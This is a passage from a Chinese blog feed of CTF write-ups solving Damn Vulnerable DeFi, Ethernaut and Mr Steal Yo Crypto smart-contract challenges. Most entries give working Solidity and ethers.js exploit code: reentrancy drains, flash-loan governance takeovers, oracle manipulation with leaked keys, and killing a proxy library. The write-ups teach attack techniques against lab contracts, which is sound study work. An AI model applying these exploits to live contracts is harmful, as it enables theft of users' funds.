指向0x800000000000000000000000000000000000000000000000000000000000000000  // 随意d9caed1200000000000000000000000000000000000000000000000000000000  // withdraw0000000000000000000000000000000000000000000000000000000000000044  // actiondata length // actiondata contens85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3s</code></pre><pre><code>const attackVault = await vault.connect(player);const attackToken = await token.connect(player);const executeFs = vault.interface.getSighash("execute")const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)              + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) const payload = executeFs +                 target +                 bytesLocation +                 ethers.utils.hexZeroPad("0x0", 32).slice(2) +                withdrawSelector + ethers.utils.hexZeroPad("0x0", 28).slice(2) +                bytesLength +                 sweepSelector +                 sweepFundsData;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mr Steal Yo Crypto-上</title>
      <link href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/"/>
      <url>/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-上"><a href="#Mr-Steal-Yo-Crypto-上" class="headerlink" title="Mr Steal Yo Crypto-上"></a>Mr Steal Yo Crypto-上</h1><h2 id="Jpeg-Sniper"><a href="#Jpeg-Sniper" class="headerlink" title="Jpeg Sniper"></a>Jpeg Sniper</h2><p>我们如果想要铸造nft，仅能通过publicSaleMint方法，但是一个地址最多只能铸造5个代币。</p><p>publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，只要在构造函数中调用即可。</p><p>那么想要在一次交易中完成，就要有主次两个合约。主合约批量构造次合约，次合约调用publicSaleMint方法。</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import "./FlatLaunchpeg.sol";contract A{    address NFT;    address attacker;    constructor(address _NFT,address _attacker){        NFT = _NFT;        attacker = _attacker;        mint();    }    function mint() public {        uint per = 5;        for(uint amount = 0;amount&lt;=60;){            new a(NFT,attacker,per,amount);            amount = amount+5;        }        new a(NFT,attacker,4,65);    }}contract a{    constructor(address _nft,address attacker,uint per,uint amount){        FlatLaunchpeg nft = FlatLaunchpeg(_nft);        nft.publicSaleMint(per);        for(uint i = 0;i&lt;per;i++){            nft.transferFrom(address(this), attacker, amount+i);        }    }}</code></pre><h2 id="Safu-Vault"><a href="#Safu-Vault" class="headerlink" title="Safu Vault"></a>Safu Vault</h2><p>我们可以看到depositFor()它与deposit()几乎是相同的实现，但是在depositFor()中token是作为参数被输入的，这是一个严重的漏洞。</p><p>我们可以随意的构造safeTransferFrom()。比如在safeTransferFrom()中调用depositFor()进行重入攻击。</p><pre><code>function transferFrom(    address from,    address to,    uint256 _amount) public returns (bool) {    if (count &lt; reentrancy_count) {        count++;        safuVault.depositFor(address(this), uint256(0), owner);        usdc.transfer(address(safuVault), amount);    }    return true;}</code></pre><h2 id="Game-Assets"><a href="#Game-Assets" class="headerlink" title="Game Assets"></a>Game Assets</h2><p>AssetWrapper合约可以随意使用用户的NFT因为</p><pre><code>// set operator of the two game assets to be the wrapper contract        vm.prank(admin);        swordAsset.setOperator(address(assetWrapper));        vm.prank(admin);        shieldAsset.setOperator(address(assetWrapper));</code></pre><p>本题的漏洞在于AssetWrapper合约的wrap()方法。</p><p>在wrap()中采用了铸造assetWrapper代币，再验证的模式，这是十分不合理的。</p><p>当mint时会触发_doSafeBatchTransferAcceptanceCheck()。这个方法中存在外部调用。</p><pre><code>try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response)</code></pre><p>这时我们销毁assetWrapper代币，AssetWrapper合约便会将NFT发给我们。</p><pre><code>    //SPDX-License-Identifier: MIT    pragma solidity ^0.8.4;    import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";    interface AssertWrap{        function wrap(            uint256 nftId,            address assetOwner,            address assetAddress        ) external;        function unwrap(            address assetOwner,            address assetAddress        ) external;    }    contract Attack{        address assertWarp;        address nft1;        address nft2;        int count = 0 ;        constructor(address _warp,address token1,address token2) public{            assertWarp = _warp;            nft1 = token1;            nft2 = token2;        }        function attack() public {            AssertWrap(assertWarp).wrap(0,address(this),nft1);            AssertWrap(assertWarp).wrap(0,address(this),nft2);        }        function onERC1155Received(            address operator,            address from,            uint256 id,            uint256 value,            bytes calldata data        ) external returns (bytes4){            if(count == 0){            AssertWrap(assertWarp).unwrap(address(this), nft1);            count++;            return IERC1155Receiver.onERC1155Received.selector;}            AssertWrap(assertWarp).unwrap(address(this), nft2);            return IERC1155Receiver.onERC1155Received.selector;        }    }</code></pre><h2 id="Free-Lunch"><a href="#Free-Lunch" class="headerlink" title="Free Lunch"></a>Free Lunch</h2><p>SafuMakerV2可以将所有的代币转化成SAFU,并在将来分给xSAFU的持有者。</p><pre><code>safuPair.transfer(address(safuMaker),10_000e18); // 1% of LP</code></pre><p>我们可看到safuMaker中有10000的(USDC-SAFU)LP。那我们是否可以建一个(USDC-SAFU)-SAFU的Pool呢？</p><pre><code>/// solves the challengefunction testChallengeExploit()public{    vm.startPrank(attacker, attacker);   //搞一点(USDC-SAFU)的LP    usdc.approve(address(safuRouter), type(uint).max);    safu.approve(address(safuRouter), type(uint).max);    safuRouter.addLiquidity(        address(usdc),        address(safu),        80e18,        80e18,        0,        0,        attacker,        block.timestamp    );       safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc), address(safu)));    //建立以个(USDC-SAFU)-SAFU的Pool，并添加流动性。    safuPair.approve(address(safuRouter), type(uint).max);    safuRouter.addLiquidity(        address(safuPair),        address(safu),        safuPair.balanceOf(attacker),        5e18,        0,        0,        address(attacker),        block.timestamp    );       IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair), address(safu)));    //往safuMaker随意转一点。    sifuPair.transfer(address(safuMaker), 1e18);        /*    本题的关键就在convert()方法中。    safuMaker会将自己所有的代币转化成SAFU，    这在(USDC-SAFU)-SAFU的Pool会有大量的(USDC-SAFU)LP，    这时我们移除(USDC-SAFU)-SAFU流动性会获得大量的(USDC-SAFU)LP,    我们再在USDC-SAFU的Pool中移除流动性即可。    */    safuMaker.convert(address(safuPair), address(safu));       sifuPair.approve(address(safuRouter), type(uint).max);    safuRouter.removeLiquidity(        address(safuPair),        address(safu),        sifuPair.balanceOf(attacker),        0,        0,        address(attacker),        block.timestamp    );       safuRouter.removeLiquidity(        address(usdc),        address(safu),        safuPair.balanceOf(attacker),        0,        0,        address(attacker),        block.timestamp    );    vm.stopPrank();    validation();}</code></pre><h2 id="Safu-Wallet"><a href="#Safu-Wallet" class="headerlink" title="Safu Wallet"></a>Safu Wallet</h2><p>如果我们能够通过修饰符onlymanyowners()，我们就可以破坏合约。</p><p>我们通过观察很容一发现，SafuWallet 合约是代理合约SafuWalletLibrary为逻辑合约。<br>这意味着这意味着我们虽然调用了initWallet()，但是SafuWalletLibrary的状态并未改变。<br>我们依然可以调用initWallet();</p><pre><code>addresses = new address[](1);addresses[0] = attacker;data = abi.encodeWithSignature("initWallet(address[],uint256,uint256)", addresses, 1, type(uint).max);address(safuWalletLibrary).call(data);data = abi.encodeWithSignature("kill(address)", address(attacker));address(safuWalletLibrary).call(data);</code></pre><h2 id="Tasty-Stake"><a href="#Tasty-Stake" class="headerlink" title="Tasty Stake"></a>Tasty Stake</h2><p>这题和Safu Vault的漏洞相似。migrateStake()方法意在将旧的TastyStaking合约中的STEAK和reward代币转移到本合约上。<br>但未对外部调用审查。</p><p>因此我们可以创建一个有migrateWithdraw()方法的合约。</p><pre><code>contract Attack {    address owner;    TastyStaking _tastyStaking;    Token stakingToken;    constructor(address _target, address _stakingToken) {        attacker = msg.sender;        _tastyStaking = TastyStaking(_target);        stakingToken = Token(_stakingToken);    }      function migrateWithdraw(address staker, uint256 amount) external {            }    function pwn() external {        _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));        _tastyStaking.withdrawAll(false);        stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));    }}</code></pre><h2 id="Freebie"><a href="#Freebie" class="headerlink" title="Freebie"></a>Freebie</h2><p>额，这题与Tasty Stake的漏洞一模一样。</p><pre><code>contract Attack {    Token farm;    GovToken govToken;    RewardsAdvisor rewardsAdvisor;    address attacker;    constructor(address _target, address _farm, address _xfarm) {        farm = Token(_farm);        govToken = GovToken(_xfarm);        rewardsAdvisor = RewardsAdvisor(_target);        attacker = msg.sender;    }        function delegatedTransferERC20(address token, address to, uint256 amount) external {            }    function pwn(address _target) external {        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);        rewardsAdvisor.deposit(amount, payable(address(this)), address(this));        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)), attacker, payable(address(this)));    }}</code></pre><h2 id="NFT-Bonanza"><a href="#NFT-Bonanza" class="headerlink" title="NFT Bonanza"></a>NFT Bonanza</h2><h2 id="Inflationary-Net-Worth"><a href="#Inflationary-Net-Worth" class="headerlink" title="Inflationary Net Worth"></a>Inflationary Net Worth</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mr Steal Yo Crypto-下</title>
      <link href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/"/>
      <url>/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-下"><a href="#Mr-Steal-Yo-Crypto-下" class="headerlink" title="Mr Steal Yo Crypto-下"></a>Mr Steal Yo Crypto-下</h1>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解（中）</title>
      <link href="/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/"/>
      <url>/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解-中"><a href="#Damn-Defi-题解-中" class="headerlink" title="Damn Defi 题解(中)"></a>Damn Defi 题解(中)</h1><h2 id="selfi"><a href="#selfi" class="headerlink" title="selfi"></a>selfi</h2><p>一个提供DVT代币的闪电贷，池中有一百五十万个DVT。我们身无分文，但是我们需要拿走全部的DVT。<br>这个题和以往的题唯一不同的地方，就是多了一个治理机制。</p><p>SelfiePool：这个池里有一个闪电贷的函数，同时有一个可以转出所有资金的函数drainAllFunds()，但是只能被治理合约所调用。</p><p>SimpleGovernance：这就是之前提到的治理合约，queueAction函数会验证你是否拥有足够的token，当你拥有了矿池中半数以上的DVT代币后（我们现在有闪借池，这点很容易绕过），在两天之后输入你的id即可在executeAction中执行该调用。</p><p>很明显，我们可以通过executeAction函数中去执行闪电贷合约中的drainAllFunds函数，即可绕开onlyGovernance的限定。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "./SimpleGovernance.sol";import "./SelfiePool.sol";import "../DamnValuableTokenSnapshot.sol";contract SelfieExploit {    SimpleGovernance public goverance;    SelfiePool public pool;    address attcker;    uint256 actionId;    constructor(address _pool, address _goverance){        pool = SelfiePool(_pool);        goverance = SimpleGovernance(_goverance);        attcker = msg.sender;    }    function exploit (uint256 _amount) public {        pool.flashLoan(_amount);    }    function receiveTokens (address _token, uint256 amount) external {        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);        token.snapshot();        actionId = goverance.queueAction(address(pool),            abi.encodeWithSignature(                "drainAllFunds(address)",                attcker            ),            0);         token.transfer(address(pool), amount);    }    function drainToAttacker() external {        goverance.executeAction(actionId);    }    receive () external payable {}}</code></pre><h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><p>一个交易所在售卖一种代币DVNFT，每个价值999ETH，要我们以0.1ETH的余额来拿走交易所中全部的ETH。</p><p> Exchange：一个简单的交易所。</p><p> TrustfulOracle：一个预言机合约。这个预言机值得我们仔细阅读。这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过postPrice()来设定自己的价格，而getMedianPrice()是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。因为只有初始化的三个可信报告者可以定价，所以我们如果能够控制这2个地址，就能够随意的更改价格。</p><p> 题目中给的两串十六进制数，先用ascii码转化，再用base64解码就可以得到三个账户中其中两个的私钥。<br>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9<br>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {               /** CODE YOUR EXPLOIT HERE */       //用二者私钥创建钱包       const sources1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);       const sources2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);       //将NFT价格设置为1wei       await this.oracle.connect(sources1).postPrice("DVNFT", 1);       await this.oracle.connect(sources2).postPrice("DVNFT", 1);       //买入       await this.exchange.connect(attacker).buyOne({value:1});       //重新将价格设置为exchange合约的总余额       _balance =  ethers.provider.getBalance(this.exchange.address);       await this.oracle.connect(sources1).postPrice("DVNFT", _balance);       await this.oracle.connect(sources2).postPrice("DVNFT", _balance);       //卖出       await this.nftToken.connect(attacker).approve(this.exchange.address, 0);       await this.exchange.connect(attacker).sellOne(0);   });</code></pre><h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><p> 有一个借贷池在借贷DVT，池中有十万DYT,题直接通过abi引用了一个已经编译了的Uniswap v1的合约,我们需要以25ETH和1000DVT的余额拿走借贷池中的所有代币。</p><p> 写这题我们先要了解Uniswap v1。可以看看这个<a href="https://zhuanlan.zhihu.com/p/552867213">传送门</a>。</p><p> 在了解了uniswap v1后，我们就应该知道，题中没有足够多的流动性来应对大规模的买进卖出。因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {      await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);      // 在交易所置换自己所有的token      await this.uniswapRouter.connect(attacker).swapExactTokensForETH(          ATTACKER_INITIAL_TOKEN_BALANCE,          0,          [this.token.address, this.uniswapRouter.WETH()],          attacker.address,          9999999999      );            console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());      //计算borrow所有token所需要的eth      const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);      //先往钱包里存钱      await this.weth.connect(attacker).deposit({value:amount});      await this.weth.connect(attacker).approve(this.lendingPool.address, amount);      await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);  });</code></pre><h2 id="Puppet-V2"><a href="#Puppet-V2" class="headerlink" title="Puppet V2"></a>Puppet V2</h2><p>这次题目采用了uniswapv2，我们有20ETH和10000DVT代币，需要我们讲借贷池中的100万DVT代币全部拿走。</p><p>这题虽然用了uniswapv2，但是和上一题差别不大。思路也一样。</p><h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);       // 在交易所置换自己所有的token       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(           ATTACKER_INITIAL_TOKEN_BALANCE,           0,           [this.token.address, this.uniswapRouter.WETH()],           attacker.address,           9999999999       );              console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());       //计算borrow所有token所需要的eth       const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);       //先往钱包里存钱       await this.weth.connect(attacker).deposit({value:amount});       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);   });</code></pre><h2 id="Free-Rider"><a href="#Free-Rider" class="headerlink" title="Free Rider"></a>Free Rider</h2><p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p><p>本题的关键就是这2串代码</p><pre class=" language-1"><code class="language-1">_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); payable(_token.ownerOf(tokenId)).sendValue(priceToPay);</code></pre><p> 这存在很明显的逻辑漏洞。在nft从owner转给我们之后，再将用于购买的eth又发给了代币拥有者，但这时的代币拥有者已经变成了买家，所以等于买家没花任何钱就买到了nft。</p><h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {       const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);       const attackContract = await AttackFactory.deploy(           this.weth.address,            this.uniswapFactory.address,           this.token.address,           this.marketplace.address,           this.buyerContract.address,           this.nft.address,           );       await attackContract.flashSwap(this.weth.address, NFT_PRICE, {           gasLimit: 1e6       });   });</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解（上）</title>
      <link href="/2023/02/24/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
      <url>/2023/02/24/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解（上）"><a href="#Damn-Defi-题解（上）" class="headerlink" title="Damn Defi 题解（上）"></a>Damn Defi 题解（上）</h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>题目给了一个闪电贷合约，要求我们停止这个闪电贷合约继续运行。<br>可以注意到这个闪电贷函数是有明显问题的。</p><pre class=" language-1"><code class="language-1">if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></pre><p>convertToShares(totalSupply) != balanceBefore;这个判断不严谨。<br>而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加.这就会造成此闪电贷池宕机。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我们只需要向该合约提交一笔转账即可。</p><pre class=" language-1"><code class="language-1">await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );</code></pre><h2 id="naive-reciever"><a href="#naive-reciever" class="headerlink" title="naive-reciever"></a>naive-reciever</h2><p>借贷池中有一千个eth，而用户拥有十个eth，我们要做的就是将用户的这十个ETH掏空。<br>这个flashloan函数只要被调用一次就会抽取1ETH的小费。但是接收器没有判断消息的发送者是否为msg.sender。</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>只需要循环调用flashloan函数即可</p><pre class=" language-1"><code class="language-1">for(let i = 0; i < 10; i++){            await this.pool.connect(attacker).flashLoan            (thisreceiver.address, "0");        }</code></pre><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>题目要求我们取走闪电贷合约的一百万的余额。我们开始没有币。<br>这是一个关于外部调用的一个漏洞。<br>ReentrancyGuard并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。<br>解题关键是这串代码。</p><pre class=" language-1"><code class="language-1">target.functionCall(data);</code></pre><p>functioncall函数是由Address.sol提供的一个调用方法。<br>那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池approve给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>js:</p><pre class=" language-1"><code class="language-1">it('Exploit', async function () {    // 计算我们要的data;        const data = web3.eth.abi.encodeFunctionCall(            {                name: 'approve',                type: 'function',                inputs: [                    {                        type: 'address',                        name: 'addr'                    },                    {                        type: 'uint256',                        name: 'amount'                    }                ]            },[attacker.address, TOKENS_IN_POOL]        );        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);    });</code></pre><p>soildity:</p><pre class=" language-1"><code class="language-1">    pragma solidity ^0.8.0;import "./TrusterLenderPool.sol";import "@openzeppelin/contracts/token/ERC20/IERC20.sol";interface ITrusterLenderPool{    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;}contract TrusterExploit{    ITrusterLenderPool cons;    uint256 balanceOfPool;    address tokenAdr;    address poolAdr;    constructor(address _pool, uint256 BalanceOfPool, address _token){        cons = ITrusterLenderPool(_pool);        poolAdr = _pool;        balanceOfPool = BalanceOfPool;        tokenAdr = _token;    }    function attack() public {        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature("approve(address,uint256)", address(this), balanceOfPool));        IERC20 token = IERC20(tokenAdr);        token.transferFrom(poolAdr, msg.sender,balanceOfPool);    }}</code></pre><h2 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h2><p>一个借贷池有一千ETH余额，我们将借贷池掏空。<br>通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘。<br>我们可以在运行IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()中，在接到钱后，用 deposit() 函数存钱，我们就可以通过<br>if (address(this).balance &lt; balanceBefore)<br>            revert RepayFailed();<br>    }<br>之后再取。</p><h3 id="Expolit"><a href="#Expolit" class="headerlink" title="Expolit"></a>Expolit</h3><p>solidity</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "./SideEntranceLenderPool.sol";// interface IFlashLoanEtherReceiver {//     function execute() external payable;// }contract SideEntranceExploit is IFlashLoanEtherReceiver{    SideEntranceLenderPool pool;    address payable attacker;    constructor(address _pool){        pool = SideEntranceLenderPool(_pool);        attacker = payable(msg.sender);    }    function attack(uint256 _amount) public{        pool.flashLoan(_amount);        pool.withdraw();    }    function execute() external payable override {        pool.deposit{value:address(this).balance}();    }        receive() external payable{        attacker.transfer(address(this).balance);    }}</code></pre><p>js</p><pre class=" language-1"><code class="language-1">it('Exploit', async function () {        const SideEntranceLenderAttackFactory = await ethers.getContractFactory("sideEntranceLenderAttack",attacker)        const attack = await SideEntranceLenderAttackFactory.deploy(this.pool.address)        await attack.connect(attacker).attack(ETHER_IN_POOL)        await attack.connect(attacker).withdraw()    });</code></pre><h2 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h2><p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。，而我们没有DVT代币，却也希望得到奖励。</p><p>RewardToken:<br>这是一个的ERC20的Token,唯一的区别就是这个奖励币可以被无限铸.</p><p>AccountingToken:<br>这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。</p><p>TheRewarderPool:<br>这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。</p><p>FlashLoanerPool:这是比较常见的闪电贷池。但是，出现了外部调用。  msg.sender.functionCall(abi.encodeWithSignature(“receiveFlashLoan(uint256)”, amount));我们可能利用receiveFlashLoan()函数干一些坏事。<br>那我们的思路已经很明确了，就是在闪电贷合约中借钱，然后存入矿池中，继而得到奖励代币，再将奖励代币发送给attacker，然后将钱返还给闪电贷合约，即可完成攻击。</p><h3 id="Expolit-1"><a href="#Expolit-1" class="headerlink" title="Expolit"></a>Expolit</h3><p>solidity</p><pre class=" language-1"><code class="language-1">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import "./RewardToken.sol";import "../DamnValuableToken.sol";import "./TheRewarderPool.sol";import "./FlashLoanerPool.sol";contract rewardAttack {    RewardToken rewardTO;    TheRewarderPool rewardPool;    DamnValuableToken liquidToken;    FlashLoanerPool flashPool;    constructor(        address rt,        address rp,        address lt,        address fl    ) public {        rewardTO = RewardToken(rt);        rewardPool = TheRewarderPool(rp);        liquidToken = DamnValuableToken(lt);        flashPool = FlashLoanerPool(fl);    }    function attack() public {        uint256 amount = liquidToken.balanceOf(address(flashPool));        flashPool.flashLoan(amount);    }    function receiveFlashLoan(uint256 amount) public {        liquidToken.approve(address(rewardPool), amount);        rewardPool.deposit(amount);        rewardPool.withdraw(amount);        liquidToken.transfer(address(flashPool), amount);    }    function complete() public {        rewardTO.transfer(msg.sender, rewardTO.balanceOf(address(this)));    }    fallback() external payable {}}</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这应该是所有希望激励用户存款的系统都会面临的漏洞。你的协议可能希望激励长期质押，而不是短期套利交易。因此，最好是摆脱回合，根据存款的每一秒来计算奖励</p>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录(下)</title>
      <link href="/2022/12/17/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2022/12/17/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解——摘录-下"><a href="#Ethernaut题解——摘录-下" class="headerlink" title="Ethernaut题解——摘录(下)"></a>Ethernaut题解——摘录(下)</h1><h2 id="Dex-And-Dex-Two"><a href="#Dex-And-Dex-Two" class="headerlink" title="Dex And Dex Two"></a>Dex And Dex Two</h2><p>这两题大差不差，题意就是玩家账户上的 token1 和 token2 都各有 10 个 token，而题目账户上每种有 100 个，题1目的是把题目账户上的某个 token 清零。<br>题2目的是把题目账户上都 token 清零。</p><p>题1的漏洞点在于，在计算每次交换的代币数量时，getSwapPrice函数内部使用了除法，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币，从而达到清空题目合约拥有代币数的目的。</p><pre class=" language-1"><code class="language-1">token1 = (await contract.token1())token2 = (await contract.token2())await contract.swap(token1,token2,10)await contract.swap(token2,token1,20)await contract.swap(token1,token2,24)await contract.swap(token2,token1,30)await contract.swap(token1,token2,41)await contract.swap(token2,token1,45)</code></pre><p>题2与题1明显没有 </p><pre class=" language-1"><code class="language-1">require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");</code></pre><p>也就是说可以有第3方token进入。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.6.0;import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";contract Mytoken is ERC20 {    address public target;  constructor(string memory name,              string memory symbol,              uint256 number) public ERC20(name, symbol) {             _mint(msg.sender, number);            }}</code></pre><p>设置number为200，也就是让我们初始拥有200个恶意token。。然后approve题目地址，并转给题目地址100个token，这样我们和题目合约初始情况下各拥有100个恶意合约的token。</p><p>然后执行</p><pre class=" language-1"><code class="language-1">await contract.approve(player,1000)await contract.approve(contract.address,1000)token1 = (await contract.token1())token2 = (await contract.token2())// mytoken1和mytoken2分别对应2个部署的恶意合约的地址mytoken1 =mytoken2 =await contract.swap(mytoken1,token1,100)await contract.swap(mytoken2,token2,100)</code></pre><h2 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h2><p>本题要我们成为admin。</p><p>本题使用了代理模式。因此它有一个很大的撞库风险。所以如果我们想修改admin其实可以从maxBalance入手。 而想要通过setMaxBalance修改maxBalance有一个先决条件，那就是在白名单中。而要添加到白名单，需要调用addToWhitelist，这又需要require(msg.sender == owner, “Not the owner”);所以我们可以先通过修改pendingAdmin修改owner。大致思路就是这样。</p><p>先手动调用proposeNewAdmin。</p><pre class=" language-1"><code class="language-1">functionSignature = {    name: 'proposeNewAdmin',    type: 'function',    inputs: [        {            type: 'address',            name: '_newAdmin'        }    ]}params = [player]data = 